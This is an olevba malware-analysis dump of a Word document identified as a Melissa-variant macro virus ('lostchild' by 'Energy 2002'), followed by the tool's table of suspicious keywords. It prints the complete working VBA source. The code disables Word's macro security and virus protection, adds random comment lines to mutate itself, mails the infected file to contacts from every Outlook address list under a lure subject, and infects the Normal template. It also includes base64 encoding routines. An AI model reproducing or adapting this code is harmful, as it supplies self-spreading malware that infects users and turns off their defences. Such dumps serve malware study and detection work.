olevba 0.60.1.dev6 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Melissa.bk-d8e177829e373ef924759efd4ee5b2035b23212a
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Melissa.bk-d8e177829e373ef924759efd4ee5b2035b23212a - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO lostchild.bas 
in file: Virus.MSWord.Melissa.bk-d8e177829e373ef924759efd4ee5b2035b23212a - OLE stream: 'Macros/VBA/lostchild'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
On Error Resume Next
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security", "Level") <> "" Then
  CommandBars("Macro").Controls("Security...").Enabled = False
  System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security", "Level") = 1&
Else
  CommandBars("Tools").Controls("Macro").Enabled = False
  Options.ConfirmConversions = (1 - 1): Options.VirusProtection = (1 - 1): Options.SaveNormalPrompt = (1 - 1)
End If

MuNu = Int(Rnd() * 20 + 1)

For Mutate = 1 To MuNu

MuRL = Application.VBE.ActiveVBProject.VBComponents("lostchild").CodeModule.CountOfLines

MuLi = Int(Rnd() * MuRL + 1)

MuLe = Int(Rnd() * 40 + 1)

For MuGe = 1 To MuLe

LiVe = Int((120 - 100 + 1) * Rnd + 228)

MuRe = MuRe + Chr$(LiVe)

Next MuGe

Application.VBE.ActiveVBProject.VBComponents("lostchild").CodeModule.InsertLines MuLi, vbTab & "' " & MuRe

MuRe = ""

Next Mutate

Dim UngaDasOutlook, DasMapiName, BreakUmOffASlice
Set UngaDasOutlook = CreateObject("Outlook.Application")
Set DasMapiName = UngaDasOutlook.GetNameSpace("MAPI")
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "lostchild") <> "by Energy 2002" Then
  If UngaDasOutlook = "Outlook" Then
    DasMapiName.Logon "profile", "password"
    For y = 1 To DasMapiName.AddressLists.Count
        Set AddyBook = DasMapiName.AddressLists(y)
        x = 1
        Set BreakUmOffASlice = UngaDasOutlook.CreateItem(0)
        For oo = 1 To AddyBook.AddressEntries.Count
            Peep = AddyBook.AddressEntries(x)
            BreakUmOffASlice.Recipients.Add Peep
            x = x + 1
            If x > 10 Then oo = AddyBook.AddressEntries.Count
         Next oo
         BreakUmOffASlice.Subject = "The Story of the Lost Child" & Application.UserName
         BreakUmOffASlice.Body = "This has got to be the most horrid story I have ever read in my whole life."
         BreakUmOffASlice.Body = "To make it worse it is based on a true story!"
         BreakUmOffASlice.Body = "Take a look at it."
         BreakUmOffASlice.Attachments.Add ActiveDocument.FullName
         BreakUmOffASlice.Send
         Peep = ""
    Next y
    DasMapiName.Logoff
  End If
  

Set ADI1 = ActiveDocument.VBProject.VBComponents.Item(1)
Set NTI1 = NormalTemplate.VBProject.VBComponents.Item(1)
NTCL = NTI1.CodeModule.CountOfLines
ADCL = ADI1.CodeModule.CountOfLines
BGN = 2
If ADI1.Name <> "lostchild" Then
  If ADCL > 0 Then ADI1.CodeModule.DeleteLines 1, ADCL
  Set ToInfect = ADI1
  ADI1.Name = "lostchild"
  DoAD = True
End If

If NTI1.Name <> "lostchild" Then
  If NTCL > 0 Then NTI1.CodeModule.DeleteLines 1, NTCL
  Set ToInfect = NTI1
  NTI1.Name = "lostchild"
  DoNT = True
End If
    
If DoNT <> True And DoAD <> True Then GoTo CYA

If DoNT = True Then
  Do While ADI1.CodeModule.Lines(1, 1) = ""
    ADI1.CodeModule.DeleteLines 1
  Loop
  ToInfect.CodeModule.AddFromString ("Private Sub Document_Close()")
  Do While ADI1.CodeModule.Lines(BGN, 1) <> ""
    ToInfect.CodeModule.InsertLines BGN, ADI1.CodeModule.Lines(BGN, 1)
    BGN = BGN + 1
  Loop
End If
  
If DoAD = True Then
  Do While NTI1.CodeModule.Lines(1, 1) = ""
    NTI1.CodeModule.DeleteLines 1
  Loop
  ToInfect.CodeModule.AddFromString ("Private Sub Document_Open()")
  Do While NTI1.CodeModule.Lines(BGN, 1) <> ""
    ToInfect.CodeModule.InsertLines BGN, NTI1.CodeModule.Lines(BGN, 1)
    BGN = BGN + 1
  Loop
End If

CYA:

If NTCL <> 0 And ADCL = 0 And (InStr(1, ActiveDocument.Name, "Document") = False) Then
  ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
ElseIf (InStr(1, ActiveDocument.Name, "Document") <> False) Then
  ActiveDocument.Saved = True
End If
End If
End Sub
-------------------------------------------------------------------------------
VBA MACRO energy.bas 
in file: Virus.MSWord.Melissa.bk-d8e177829e373ef924759efd4ee5b2035b23212a - OLE stream: 'Macros/VBA/energy'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 


Option Explicit
DefInt A-Z

Const energyALPHABET = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"

Function energyDecodeFile%(ByVal QuellDatei$, ByVal ZielDatei$)
   Dim hCFil%
   
   On Error Resume Next
   
   hCFil = FreeFile
   Open QuellDatei For Binary As #hCFil
   If Err = 0 Then
      energyDecodeFile = energylDecPart(hCFil, LOF(hCFil), ZielDatei)
      Close #hCFil
   End If
   
End Function

Private Function energylDecPar1%(ByVal hCFil%, ByVal nLen&, ByVal sFNam$)
   Dim hFil%, lPut%, sCh$, sBuf$
   Dim energyPLUSEOF$
   energyPLUSEOF = energyALPHABET + "="

   On Error Resume Next
   
   hFil = FreeFile
   Open sFNam For Binary As #hFil
   If Err Then
      Exit Function     ' Return False
   End If

   sCh = String$(1, 0)
   Do While nLen > 0
      Get #hCFil, , sCh
      If EOF(hCFil) Or Err <> 0 Then
         lPut = True ' Buf-flush
         nLen = 0    ' Exit Do und nLen => -1
      ElseIf InStr(energyPLUSEOF, sCh) > 0 Then
         sBuf = sBuf + sCh
         lPut = nLen = 1
      Else
         lPut = sBuf <> ""
      End If
      If lPut Then
         sBuf = energysDecode(sBuf)
         Put #hFil, , sBuf
         sBuf = ""
      End If
      nLen = nLen - 1
   Loop
   Close #hFil
   
   energylDecPar1 = Err = 0 And nLen = 0
   
End Function
Private Function energylDecPart%(ByVal hCFil%, ByVal nLen&, ByVal sFNam$)
   Const BUFLEN = 8192
   Dim hFil%, lPut%, nCnt&, nI&, sFBuf$, sBuf$, sOBuf$
   Dim energyPLUSEOF$
   energyPLUSEOF = energyALPHABET + "="

   On Error Resume Next
   
   hFil = FreeFile
   Open sFNam For Binary As #hFil

   nCnt = nLen \ BUFLEN
   sFBuf = String$(BUFLEN, 0)
   Do While Err = 0
         DoEvents
      If nCnt <= 0 Then
         If nLen <= 0 Or nCnt < 0 Then
            Exit Do
         End If
         sFBuf = String$(nLen Mod BUFLEN, 0)
      End If
      Get #hCFil, , sFBuf

      sBuf = sBuf + sFBuf
      sOBuf = ""
      For nI = 1 To Len(sBuf)
         If InStr(energyPLUSEOF, Mid$(sBuf, nI, 1)) > 0 Then
            sOBuf = sOBuf + Mid$(sBuf, nI, 1)
         End If
      Next nI
      nI = Len(sOBuf) Mod 4
      sBuf = Right$(sOBuf, nI)   ' f. nהchstes Mal
      sOBuf = energysDecode(Left$(sOBuf, Len(sOBuf) - nI))
      Put #hFil, , sOBuf
      
      nCnt = nCnt - 1
   Loop
   
   If sBuf <> "" And Err = 0 Then
      sOBuf = energysDecode(sBuf)
   End If
   
   Close #hFil
   

   energylDecPart = 0 And sBuf = ""
   
End Function
Public Function energyEncodeFile%(ByVal QuellDatei$, ByVal ZielDatei$)
   Const BUFLEN = 54 ' == 72 kodierte Zeichen (< 76 s.RFC2045)
   Dim hFil%, hFilDest%, nLineN&, nLineRest%
   Dim sBuf$
   
   On Error Resume Next
   hFil = FreeFile
   Open QuellDatei For Binary As #hFil
   
   hFilDest = FreeFile
   Open ZielDatei For Output As #hFilDest
   
   nLineN = LOF(hFil) \ BUFLEN
   nLineRest = LOF(hFil) Mod BUFLEN
   sBuf = Space(BUFLEN)
   Do While nLineN > 0 And Err = 0
         DoEvents
      Get #hFil, , sBuf
      Print #hFilDest, energysEncode(sBuf, BUFLEN)
      nLineN = nLineN - 1
   Loop
      
   If Err = 0 Then
      sBuf = Space(nLineRest)
      Get #hFil, , sBuf
      Print #hFilDest, energysEncRest(sBuf, nLineRest)
   End If
   
   Close #hFil
   Close #hFilDest
   
   energyEncodeFile = 0

End Function

Private Function energysDecode$(sBuf$)
   Dim nI%, nPos1%, nPos2%, nPos3%, nPos4%, sRet$
   
   If Len(sBuf) Mod 4 <> 0 Then
   End If

   'sRet = ""
   For nI = 1 To Len(sBuf) Step 4
      nPos1 = InStr(energyALPHABET, Mid$(sBuf, nI, 1)) - 1
      nPos2 = InStr(energyALPHABET, Mid$(sBuf, nI + 1, 1)) - 1
      nPos3 = InStr(energyALPHABET, Mid$(sBuf, nI + 2, 1)) - 1
      nPos4 = InStr(energyALPHABET, Mid$(sBuf, nI + 3, 1)) - 1
      If nPos1 >= 0 And nPos2 >= 0 Then
         sRet = sRet + Chr$(nPos1 * 4 + nPos2 \ 16)
      End If
      If nPos2 >= 0 And nPos3 >= 0 Then
         sRet = sRet + Chr$((nPos2 Mod 16) * 16 + nPos3 \ 4)
      End If
      If nPos3 >= 0 And nPos4 >= 0 Then
         sRet = sRet + Chr$((nPos3 Mod 4) * 64 + nPos4)
      End If
   Next nI
   
   energysDecode = sRet
   
End Function

Private Function energysEncode$(ByVal sBuf$, ByVal nLen%)
   Dim nI&
   Dim sRet$
   
   For nI = 1 To nLen Step 3
      sRet = sRet + Mid$(energyALPHABET, (Asc(Mid$(sBuf, nI, 1)) \ 4) + 1, 1)
      sRet = sRet + Mid$(energyALPHABET, ((Asc(Mid$(sBuf, nI, 1)) Mod 4) * 16 + Asc(Mid$(sBuf, nI + 1, 1)) \ 16) + 1, 1)
      sRet = sRet + Mid$(energyALPHABET, ((Asc(Mid$(sBuf, nI + 1, 1)) Mod 16) * 4 + Asc(Mid$(sBuf, nI + 2, 1)) \ 64) + 1, 1)
      sRet = sRet + Mid$(energyALPHABET, (Asc(Mid$(sBuf, nI + 2, 1)) Mod 64) + 1, 1)
   Next nI
   
   energysEncode = sRet
   
End Function

Private Function energysEncRest$(ByVal sBuf$, ByVal nLen%)
   Dim nRestN%, nPadN%
   Dim sRest$

   nRestN = nLen Mod 3
   'nPadN = 0
   'sRest = ""
   If nRestN <> 0 Then
      nPadN = 3 - nRestN
      sRest = Left$(energysEncode(Right$(sBuf, nRestN) + String$(nPadN, 0), 3), nRestN + 1) + String$(nPadN, "=")
   End If
   
   energysEncRest = energysEncode(Left$(sBuf, nLen - nRestN), nLen - nRestN) + sRest

End Function


+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Put                 |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Binary              |May read or write a binary file (if combined |
|          |                    |with Open)                                   |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Application.VBE     |Executable file name                         |
+----------+--------------------+---------------------------------------------+

